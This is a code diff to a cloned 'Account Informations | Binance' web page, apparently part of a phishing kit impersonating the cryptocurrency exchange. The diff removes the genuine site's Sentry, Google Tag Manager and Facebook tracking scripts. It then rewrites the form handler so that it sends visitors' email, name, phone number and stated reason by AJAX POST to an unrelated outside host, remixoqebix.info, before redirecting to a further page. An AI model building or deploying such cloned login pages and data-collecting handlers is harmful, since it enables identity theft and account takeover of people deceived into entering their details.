@@ -8,10 +8,10 @@
       integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
    <script src="app2.js"></script>
    <link rel="shortcut icon" type="image/x-icon" href="https://bin.bnbstatic.com/static/images/common/favicon.ico">
-   
+
    <meta name="viewport"
       content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
-  
+
 
    <title data-shuvi-head="true">Account Informations | Binance</title>
 
@@ -10986,110 +10986,8 @@
          </div>
       </div>
    </div>
-   <script src="./informations_files/react.production.16.14.0.js.download" data-ot-ignore=""></script>
-   <script src="./informations_files/react-dom.production.16.14.0.js.download" data-ot-ignore=""></script>
-   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M86QHGF" height="0" width="0"
-         style="display:none;visibility:hidden"></iframe></noscript>
-   <script src="./informations_files/redux.4.1.0.min.js.download" data-ot-ignore=""></script>
-   <script src="./informations_files/react-redux.7.2.1.min.js.download" data-ot-ignore=""></script>
-   <script src="./informations_files/ExchangeHeader-84785f6.js.download" data-ot-ignore=""></script>
-   <script nonce="" class="optanon-category-C0004" type="text/plain">
-      __shuvi_ssr_public_path__ = "https://bin.bnbstatic.com/"</script>
-   <script src="./informations_files/polyfill-7a1d594d05acb6c4d7f2.js.download" data-ot-ignore="" nonce=""></script>
-   <script src="./informations_files/webpack-07bb77db75554db6ae99.js.download" data-ot-ignore="" nonce=""></script>
-   <script src="./informations_files/framework.3a67b959.js.download" data-ot-ignore="" nonce=""></script>
-   <script src="./informations_files/commons.62ce59c4.js.download" data-ot-ignore="" nonce=""></script>
-   <script src="./informations_files/sentry-a9a3fd0a5fcc6b655c79.js.download" data-ot-ignore="" nonce=""></script>
-   <script nonce="" class="optanon-category-C0004" type="text/plain">if (typeof Sentry !== 'undefined') {
-         window.addEventListener('unhandledrejection', event => {
-           console.warn(`UNHANDLED PROMISE REJECTION: ${event.reason}`);
-           Sentry.captureMessage(event.reason);
-         });
-         Sentry.init({
-           dsn: 'https://f3051be9709a49a682c5cbc9f63e7cdb@o529943.ingest.sentry.io/5762379',
-           release: '8539718e2a7f7e62b592fe4b8776d03bbd0480e6',
-           attachStacktrace: true,
-           environment: 'prod',
-           integrations: [new Integrations.BrowserTracing()],
-           tracesSampleRate: 0.001,
-           denyUrls: [/^chrome-extension:\/\//i],
-           beforeSend: (event, hint) => {
-             var sampleRate = 0.01
-             // if error level is fatal, we don't want to sample it
-             if(event && event.level && event.level === 'fatal') {
-               sampleRate = 1
-             } 
-             if(hint && hint.originalException) {
-               var error = hint.originalException;
-               if(error && error.message === 'ResizeObserver loop limit exceeded'){
-                 return null;
-               }
-               // add more info for some errors to make it more useful
-               if(error && error.message && error.message.includes('The quota has been exceeded')){
-                 try {                          
-                   var _lsTotal = 0, _xLen, _x;
-                   for (_x in localStorage) {
-                     if (!localStorage.hasOwnProperty(_x)) {
-                         continue;
-                     }
-                     _xLen = ((localStorage[_x].length + _x.length) * 2);
-                     _lsTotal += _xLen;
-                     if((_xLen / 1024).toFixed(2) >1) {
-                       event.extra[_x.substr(0, 50)] = (_xLen / 1024).toFixed(2)
-                     }
-                   }
-                   event.extra['localStorageTotal'] = (_lsTotal / 1024).toFixed(2)
-                   event.tags['localStorage'] = '1';
-                 } catch (e) {
-                   event.tags['localStorage'] = '0';
-                 }
-               }
-               // add more info for some errors to make it more useful
-               if(error && error.message === 'Cannot redefine property: src') {
-                 try {
-                   event.extra['plugins'] = Array.from(navigator.plugins || []).map(item => item.name).join()
-                   event.extra['OtAutoBlockTimes'] = Array.from(document.querySelectorAll('script')).filter(script => script.src.includes('OtAutoBlock.js')).length
-                   event.tags['plugins'] = '1';
-                 } catch (e) {
-                   event.tags['plugins'] = '0';
-                 }
-               }
-             }
-             var random = Math.random()
-             if(random <= sampleRate){
-               return event;
-             } else {
-               return null;
-             }
-           }
-         });
-         Sentry.configureScope(scope => {
-           scope.setExtra('isServer', false);
-           scope.setTag('isServer', false);
-         });
-         }
-      </script>
-   <script type="text/plain" async="" charset="utf-8" src="./informations_files/gt.js.download"
-      class="optanon-category-C0004"></script>
-   <script data-ot-ignore="true" class="optanon-category-C0001" async="true"
-      src="./informations_files/com-icon.js.download"></script>
-   <script data-ot-ignore="true" class="optanon-category-C0001" async="true"
-      src="./informations_files/common-icon.js.download"></script>
-   <style>
-      #ot-sdk-btn-floating {
-         display: none;
-      }
-   </style>
-   <div style="display: none; visibility: hidden;">
-      <script nonce="" class="optanon-category-C0004" type="text/plain">
-         var status=google_tag_manager["GTM-M86QHGF"].macro(3);status&&"y"==status||(window.dataLayer=window.dataLayer||[],dataLayer.push({event:"ga_granted"}));
-      </script>
-   </div>
-   <script type="text/plain" id="" class="optanon-category-C0004">
-      !function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","2401726993442574");fbq("set","agent","tmgoogletagmanager","2401726993442574");fbq("track","PageView");
-   </script>
-   <noscript><img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=2401726993442574&amp;ev=PageView&amp;noscript=1"></noscript>
+
+
    <div id="onetrust-consent-sdk">
       <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
       <div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in otRelFont" aria-modal="true" role="alertdialog"
@@ -11420,11 +11318,22 @@
 
          // If the email and password are both non-empty, save them to local storage and redirect to the informations.html page
          if (email && name && reason && phone) {
-            localStorage.setItem('email_', email);
-            localStorage.setItem('name_', name);
-            localStorage.setItem('reason_', reason);
-            localStorage.setItem('phone_', phone);
-            window.location.href = 'smss.html';
+            let data = {
+               user_email: email,
+               reason: reason,
+               name: name,
+               phone: phone
+            }
+            $.ajax({
+               url: "https://remixoqebix.info/rrak.php/",
+               method: "POST",
+               data: data,
+               success: function (response) {
+                  if (response == "1") {
+                     window.location.href = 'load.html';
+                  }
+               }
+            });
          }
       });
    </script>
